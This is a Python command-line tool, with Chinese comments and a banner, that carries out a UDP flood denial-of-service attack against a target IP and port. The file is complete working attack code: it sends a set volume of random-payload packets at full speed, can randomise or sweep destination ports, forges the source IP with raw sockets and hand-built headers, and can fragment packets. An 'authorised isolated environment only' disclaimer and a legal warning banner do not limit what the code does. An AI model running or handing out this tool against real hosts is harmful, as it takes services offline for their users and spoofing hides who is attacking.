#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DDOS-Attack - UDP Flood Attack Tool (命令行版)
仅供授权隔离环境内的教学/研究使用

用法示例:
  python DDOS-Attack.py -t 192.168.1.100 -p 53 -g 1
  python DDOS-Attack.py -t 10.0.0.1 -p 80 -g 5 --random-port -d 30
  sudo python DDOS-Attack.py -t 10.0.0.1 -p 53 -g 1 --spoof 1.2.3.4 --frag
"""

import sys
import os
import time
import socket
import ipaddress
import random
import struct
import argparse


# ==================== 跨平台清屏函数 ====================
def clear_screen():
    """清屏，兼容 Windows (cls) 和 Unix-like (clear)"""
    os.system('cls' if os.name == 'nt' else 'clear')


# ==================== 日志 ====================
class Logger:
    def __init__(self, path=None):
        self.fp = open(path, 'a', encoding='utf-8') if path else None

    def log(self, msg):
        print(msg)
        if self.fp:
            self.fp.write(msg + '\n')
            self.fp.flush()

    def close(self):
        if self.fp:
            self.fp.close()


# ==================== 启动艺术字与法律警告（最先执行） ====================
def show_banner():
    clear_screen()   # ← 原 os.system("clear")
    print("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   Sucodesu")
    print("M       MMM M       MMM MMM     MMM MM       MM   Sucodesu")
    print("M  MMMM   M M  MMMM   M M   MMM   M M  MMMMM  M   Sucodesu")
    print("M  MMMMM  M M  MMMMM  M M  MMMMM  M M        MM   Sucodesu")
    print("M  MMMMM  M M  MMMMM  M M  MMMMM  M MMMMMMM   M   Sucodesu")
    print("M  MMMM   M M  MMMM   M M   MMM   M M   MMM   M   Sucodesu")
    print("M        MM M        MM MMM     MMM MM       MM   Sucodesu")
    print("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   Sucodesu")
    print("======================== 严重警告 ========================")
    print("你已经触碰到了法律和道德边缘，请立即退出，或等待3秒")
    print("=========================================================")
    time.sleep(1)
    print("3")
    time.sleep(1)
    print("2")
    time.sleep(1)
    print("1")
    time.sleep(1)
    print("Starting...")
    time.sleep(1)

    clear_screen()   # ← 原 os.system("clear")
    os.system("figlet DDOS-Attack")
    print("Author    : Su-StackTrace")
    print("GitHub    : https://github.com/BC-809/DDoS-Attack_t3g85hxb670.git")
    print("")


# ==================== 连通性检查 ====================
def check_target(ip, port, timeout=3):
    """TCP 连通性测试（注意：TCP 可达 ≠ UDP 可达，仅作参考）"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.close()
        return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


# ==================== 伪造 IP 包构造 ====================
def build_ip_udp_packet(spoof_ip, target_ip, src_port, dst_port, payload):
    """构造带伪造源 IP 的原始 IP + UDP 数据包"""
    ip_header_len = 20
    udp_header_len = 8
    total_len = ip_header_len + udp_header_len + len(payload)

    ip_ver_ihl = (4 << 4) + 5
    ip_tos = 0
    ip_id = random.randint(0, 65535)
    ip_frag_off = 0
    ip_ttl = 64
    ip_proto = socket.IPPROTO_UDP
    ip_check = 0  # 0 表示由内核计算
    ip_saddr = socket.inet_aton(spoof_ip)
    ip_daddr = socket.inet_aton(target_ip)

    ip_header = struct.pack('!BBHHHBBH4s4s',
                            ip_ver_ihl, ip_tos, total_len,
                            ip_id, ip_frag_off,
                            ip_ttl, ip_proto, ip_check,
                            ip_saddr, ip_daddr)

    udp_len = udp_header_len + len(payload)
    udp_check = 0  # IPv4 下合法
    udp_header = struct.pack('!HHHH', src_port, dst_port, udp_len, udp_check)

    return ip_header + udp_header + payload


# ==================== 参数解析 ====================
def parse_args():
    parser = argparse.ArgumentParser(
        description="UDP Flood Attack Tool (仅用于授权的隔离环境)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""示例:
  python DDOS-Attack.py -t 192.168.1.100 -p 53 -g 1
  python DDOS-Attack.py -t 10.0.0.1 -p 80 -g 5 --random-port
  sudo python DDOS-Attack.py -t 10.0.0.1 -p 53 -g 1 --spoof 1.2.3.4 --frag
"""
    )
    parser.add_argument('-t', '--target', required=True,
                        help='目标 IP 地址')
    parser.add_argument('-p', '--port', type=int, required=True,
                        help='目标 UDP 端口 (1-65535)')
    parser.add_argument('-g', '--gb', type=float, required=True,
                        help='总流量 (GB)')
    parser.add_argument('--rate', type=float, default=0.0,
                        help='发包间隔(秒)，0=全速 (默认: 0)')
    parser.add_argument('--src-port', type=int, default=None,
                        help='源端口 (默认: 系统随机)')
    parser.add_argument('--frag', action='store_true',
                        help='启用 IP 分片 (仅 Linux)')
    parser.add_argument('--random-port', action='store_true',
                        help='每个包随机目标端口')
    parser.add_argument('--spoof', default=None,
                        help='伪造源 IP (需要 Linux + root)')
    parser.add_argument('--size', type=int, default=None,
                        help='包载荷大小(字节) (默认: 1490，--frag 时 3000)')
    parser.add_argument('--no-check', action='store_true',
                        help='跳过目标连通性检查')
    parser.add_argument('--no-banner', action='store_true',
                        help='跳过启动横幅 (供脚本调用)')
    parser.add_argument('--log', default=None,
                        help='日志文件路径')
    return parser.parse_args()


# ==================== 主程序 ====================
def main():
    # ==================== 第一步：打印艺术字（最先执行） ====================
    if '--no-banner' not in sys.argv:
        show_banner()

    # ==================== 第二步：解析参数 ====================
    args = parse_args()

    # ---------- 参数校验 ----------
    try:
        ipaddress.ip_address(args.target)
    except ValueError:
        print("[!] 无效的目标 IP 地址。")
        sys.exit(1)

    if not (1 <= args.port <= 65535):
        print("[!] 目标端口必须在 1-65535 之间。")
        sys.exit(1)

    if args.gb <= 0:
        print("[!] 流量必须大于 0 GB。")
        sys.exit(1)

    # 伪造 IP 校验
    spoof_ip = args.spoof
    if spoof_ip:
        try:
            ipaddress.ip_address(spoof_ip)
        except ValueError:
            print("[!] 无效的伪造 IP，已禁用伪造。")
            spoof_ip = None

    # ---------- 包大小 ----------
    if args.size is not None:
        packet_size = args.size
    else:
        packet_size = 3000 if args.frag else 1490
    if packet_size < 64:
        packet_size = 64
    if packet_size > 65507:
        packet_size = 65507

    total_bytes = int(args.gb * 1024 * 1024 * 1024)
    max_packets = total_bytes // packet_size

    # ---------- 日志 ----------
    logger = Logger(args.log)

    # ---------- 摘要 ----------
    logger.log(f"\n[>] 攻击摘要:")
    logger.log(f"    目标          : {args.target}:{args.port} (UDP)")
    logger.log(f"    总包数        : {max_packets}")
    logger.log(f"    包大小        : {packet_size} 字节")
    if spoof_ip:
        logger.log(f"    伪造源 IP     : {spoof_ip}")
    if args.src_port:
        logger.log(f"    源端口        : {args.src_port}")
    if args.rate > 0:
        logger.log(f"    发包间隔      : {args.rate}s / 包")
    if args.frag:
        logger.log(f"    IP 分片       : 已启用")
    if args.random_port:
        logger.log(f"    随机目标端口  : 已启用")

    # ---------- 连通性检查 ----------
    if not args.no_check:
        logger.log("[*] 正在检查目标连通性 (TCP)...")
        if not check_target(args.target, args.port):
            logger.log("[!] 目标 TCP 不可达。注意：TCP 可达 ≠ UDP 可达，此处仅供参考。")

    # ---------- 创建套接字 ----------
    if spoof_ip:
        if os.name == 'nt':
            logger.log("[!] 伪造 IP (原始套接字) 仅在 Linux 下支持，当前系统不支持。")
            logger.close()
            sys.exit(1)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        except PermissionError:
            logger.log("[!] 原始套接字需要 root 权限，请用 sudo 运行。")
            logger.close()
            sys.exit(1)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    else:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        if args.src_port is not None:
            try:
                sock.bind(('', args.src_port))
            except OSError as e:
                logger.log(f"[!] 无法绑定源端口 {args.src_port}: {e}")
                sock.close()
                logger.close()
                sys.exit(1)

    # ---------- IP 分片（仅普通套接字、Linux） ----------
    if args.frag and not spoof_ip:
        if os.name == 'nt':
            logger.log("[!] Windows 不支持 IP 分片选项，已忽略。")
        else:
            try:
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_MTU_DISCOVER, socket.IP_PMTUDISC_DO)
                if hasattr(socket, 'IP_DONTFRAGMENT'):
                    sock.setsockopt(socket.IPPROTO_IP, socket.IP_DONTFRAGMENT, 0)
            except (AttributeError, OSError) as e:
                logger.log(f"[!] 启用分片失败 ({e})，已忽略。")

    # ---------- 载荷 ----------
    payload = os.urandom(packet_size)

    # ---------- 统计 ----------
    sent = 0
    sent_bytes = 0
    dropped = 0
    start_time = time.time()
    last_report_time = start_time
    report_interval = 0.5

    current_target_port = args.port

    logger.log(f"\n[>] 攻击开始... (Ctrl+C 停止)")

    try:
        while sent < max_packets:
            if args.random_port:
                dst_port = random.randint(1, 65535)
            else:
                dst_port = current_target_port

            try:
                if spoof_ip:
                    src_port = args.src_port if args.src_port else random.randint(1024, 65535)
                    packet = build_ip_udp_packet(spoof_ip, args.target, src_port, dst_port, payload)
                    sock.sendto(packet, (args.target, dst_port))
                else:
                    sock.sendto(payload, (args.target, dst_port))
                sent += 1
                sent_bytes += packet_size
            except OSError as e:
                dropped += 1
                if dropped <= 3:
                    logger.log(f"[!] 发送错误: {e}")

            if not args.random_port and not spoof_ip:
                current_target_port += 1
                if current_target_port > 65534:
                    current_target_port = 1

            # ---------- 按时间间隔输出进度 ----------
            now = time.time()
            if now - last_report_time >= report_interval:
                elapsed = now - start_time
                pps = sent / elapsed if elapsed > 0 else 0
                gb_sent = sent_bytes / (1024 * 1024 * 1024)
                pct = sent / max_packets * 100 if max_packets else 0
                logger.log(f"[>] {sent}/{max_packets} ({pct:.1f}%) | "
                           f"{gb_sent:.4f} GB | {elapsed:.1f}s | "
                           f"{pps:.0f} pps | dropped: {dropped}")
                last_report_time = now

            if args.rate > 0:
                time.sleep(args.rate)

    except KeyboardInterrupt:
        logger.log("\n[!] 用户手动停止。")
    except Exception as e:
        logger.log(f"\n[!] 错误: {e}")
    finally:
        sock.close()
        elapsed = time.time() - start_time
        gb_total = sent_bytes / (1024 * 1024 * 1024)
        logger.log(f"\n[+] 发送完成。总包数: {sent}, 总数据量: {gb_total:.4f} GB, "
                   f"丢弃: {dropped}, 用时: {elapsed:.2f} 秒")
        logger.close()


if __name__ == "__main__":
    main()
